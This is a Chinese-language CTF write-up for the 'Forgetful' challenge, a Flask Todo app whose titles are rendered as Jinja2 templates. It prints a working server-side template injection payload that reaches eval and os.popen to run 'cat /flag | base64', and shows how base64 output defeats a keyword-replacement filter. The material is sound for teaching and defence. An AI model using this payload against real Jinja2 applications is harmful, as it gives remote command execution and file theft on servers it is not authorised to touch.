# Forgetful

## 题目简述

题目是一个 Flask Todo 应用。查看 Todo 时，用户可控的 `title` 被当作 Jinja2 模板执行，且没有有效过滤，因此存在服务端模板注入。应用会把输出中的 `hgame` 和反向字符串 `emagh` 替换成 `Stop!!!`，需要先把 flag 编码后再带出。

## 解题过程

新建 Todo，并把标题设置为 Jinja2 payload。通过基础对象的子类列表找到 `catch_warnings`，再从其初始化函数的全局变量中取得 `__builtins__`，即可调用 `eval` 和 `os.popen`：

```jinja2
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
{{ c.__init__.__globals__['__builtins__'].eval(
    "__import__('os').popen('cat /flag | base64').read()"
) }}
{% endif %}
{% endfor %}
```

保存后打开该 Todo 的查看页面，模板会在服务端执行命令。这里不直接输出 `/flag`，而是先经过 Base64：

```text
cat /flag | base64
```

这样响应中不会出现会被替换的 `hgame` 或 `emagh`。复制页面返回的 Base64 文本并在本地解码：

```python
from base64 import b64decode

encoded = "把页面返回的 Base64 文本填在这里"
print(b64decode(encoded).decode())
```

即可恢复原始 flag。官方 PDF 只记录了通用 payload 和编码绕过方法，没有保留动态实例输出，故不填写未经证实的 flag。

## 方法总结

SSTI 的关键是区分“模板源代码”和“普通字符串输出”：一旦用户输入进入 Jinja2 的模板编译路径，就可以沿 Python 对象关系访问危险全局对象。输出过滤发生在命令执行之后，只能阻止特定明文显示；先 Base64 编码再输出即可绕开这种字符串替换，但仍应在正文中解释编码的必要性，而不是只留下不可读 payload。
